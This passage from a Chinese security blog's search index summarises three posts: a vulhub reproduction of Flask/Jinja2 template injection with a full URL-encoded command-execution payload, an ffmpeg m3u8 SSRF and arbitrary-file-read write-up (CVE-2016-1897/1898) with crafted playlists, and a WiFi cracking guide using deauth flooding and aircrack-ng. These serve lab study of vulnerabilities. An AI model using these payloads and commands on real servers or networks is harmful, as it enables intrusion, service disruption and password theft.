访问http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D，得到执行结果： ","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["Flask","漏洞复现","vulhub"],"title":"Flask（Jinja2）服务端模板注入漏洞","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现","vulhub"],"content":"ffmpeg 任意文件读取漏洞/SSRF漏洞","date":"2019-02-15","objectID":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/","tags":["漏洞复现","vulhub","ffmpeg"],"title":"ffmpeg 任意文件读取漏洞/SSRF漏洞","uri":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现","vulhub"],"content":"ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898） 在FFMpeg2.X 由于在解析HTTP Live Streaming流媒体m3u8文件处理不当，可导致SSRF漏洞与任意文件读取漏洞。当网站允许用户上传多媒体文件，并使用FFMpeg进行处理时会触发该漏洞。 这个漏洞有两个CVE编号，分别是CVE-2016-1897和CVE-2016-1898，它们两个的区别在于读取文件的行数，CVE-2016-1897只能读取文件的第一行，而CVE-2016-1898可以读取文件任意行，原理基本一样，这里就一起分析了。 ","date":"2019-02-15","objectID":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/:0:0","tags":["漏洞复现","vulhub","ffmpeg"],"title":"ffmpeg 任意文件读取漏洞/SSRF漏洞","uri":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现","vulhub"],"content":"HLS（HTTP Live Streaming） 由于漏洞是出现在解析HLS流媒体文件出的问题，所以我们必须先了解HLS。 HLS（HTTP Live Streaming）是Apple公司开发的一种基于HTTP协议的流媒体通信协议，大多数都应用在PC上和iphone上。它的基本原理是把一个视频流分成很多个很小很小很小的ts流文件，然后通过HTTP下载，每次下载一点点。在一个开始一个新的流媒体会话时，客户端都会先下载一个m3u8（播放列表 Playlist）文件，里面包含了这次HLS会话的所有数据。 http://pl.youku.com/playlist/m3u8?vid=340270152\u0026type=3gphd\u0026ts=1462714824\u0026keyframe=0\u0026ep=dSaSGE6MUssC5ybeiz8bYiXiIiZdXP0O9h2CgdNnAtQnS%2Bm2\u0026sid=746271452251312590fab\u0026token=3319\u0026ctype=12\u0026ev=1\u0026oip=3395898128 这是youku一个视频的m3u8文件，内容如下： #EXTM3U #EXT-X-TARGETDURATION:6 #EXT-X-VERSION:2 #EXTINF:6, http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=0\u0026ts_end=5.9\u0026ts_seg_no=0\u0026ts_keyframe=1 #EXTINF:0, http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=5.9\u0026ts_end=6.367\u0026ts_seg_no=1\u0026ts_keyframe=1 #EXT-X-ENDLIST 解析： #EXTM3U 标签是m3u8的文件头，开头必须要这一行 #EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒 #EXT-X-VERSION:2 该标签可有可无 #EXTINF:6, 表示该一段TS流文件的长度 #EXT-X-ENDLIST 这个相当于文件结束符 这些是m3u8的最基本的标签，而问题就出在FFMpeg去请求TS流文件的时，由于我们可以伪造一个m3u8文件，FFMpeg不会判断里面的流地址，直接请求。 ","date":"2019-02-15","objectID":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/:1:0","tags":["漏洞复现","vulhub","ffmpeg"],"title":"ffmpeg 任意文件读取漏洞/SSRF漏洞","uri":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现","vulhub"],"content":"漏洞原理 SSRF漏洞： 直接用FFMpeg解析一个多媒体文件 #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0,http://192.168.123.100:8080/1.html #EXT-X-ENDLIST （#EXT-X-MEDIA-SEQUENCE或#EXT-X-TARGETDURATION必须存在任意一个，前者是定义ts流文件的序号。去掉会报错：无效文件） ffmpeg -i test.m3u8 test.mp4（也可把m3u8格式改成其他后缀，ffmpeg会自动识别为HLS流文件） 以下几个方式可以读取文件: #EXTM3U #EXT-X-TARGETDURATION:1 #EXTINF:1, /home/ctf/flag.txt #EXT-X-ENDLIST #EXTM3U #EXT-X-PLAYLIST-TYPE:VOD #EXT-X-TARGETDURATION:1 #EXT-X-VERSION:3 #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, file:///home/ctf/flag.txt #EXT-X-ENDLIST ","date":"2019-02-15","objectID":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/:2:0","tags":["漏洞复现","vulhub","ffmpeg"],"title":"ffmpeg 任意文件读取漏洞/SSRF漏洞","uri":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"WIFI 安全相关整理","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/","tags":["渗透测试","WIFI"],"title":"WIFI 密码破解","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["渗透测试"],"content":"WIFI 密码破解 ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:0:0","tags":["渗透测试","WIFI"],"title":"WIFI 密码破解","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["渗透测试"],"content":"1 原理 通过发送断开连接的请求，使得所有连接了目标 WIFI 的设备全都断开连接，设备会重新连接，然后监听其中一个设备与 WIFI 建立连接时的握手包，其中包含了密码的密文，然后使用 aircrack-ng 进行离线破解。 ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:1:0","tags":["渗透测试","WIFI"],"title":"WIFI 密码破解","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["渗透测试"],"content":"2 步骤 ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:0","tags":["渗透测试","WIFI"],"title":"WIFI 密码破解","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["渗透测试"],"content":"2.1 扫描附近 SSID 执行命令获取附近 SSID sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s 设置快捷键后变成： airport -s ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:1","tags":["渗透测试","WIFI"],"title":"WIFI 密码破解","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["渗透测试"],"content":"2.2 抓握手包 信息 mac 下需要先安装 aircrack-ng brew install aircrack-ng airport en0 sniff 信道 等待一段时间后，CTRL+C 结束监听 检测这个包里是否抓到里握手包（是否包含密码信息）： sudo aircrack-ng /tmp/airportSniffTRT4xj.cap 注：因为同一个信道可能并不止一个 WIFI 信号在使用，所以会探测多个 WIFI ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:2","tags":["渗透测试","WIFI"],"title":"WIFI 密码破解","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["渗透测试"],"content":"2.3 DeAuth 泛洪攻击 sudo aireplay-ng -0 0 -a WIFI物理地址 -c 用户设备物理地址 wlan0mon 参数 -0 3 表示发送3次，-0 0 表示持续发送。 不加 -c 参数表示断开所有客户端的连接 ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:3","tags":["渗透测试","WIFI"],"title":"WIFI 密码破解","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["渗透测试"],"content":"2.4 破解握手密码包 sudo aircrack-ng /tmp/airportSniffTRT4xj.cap -w 字典路径 ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:4","tags":["渗透测试","WIFI"],"title":"WIFI 密码破解","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}]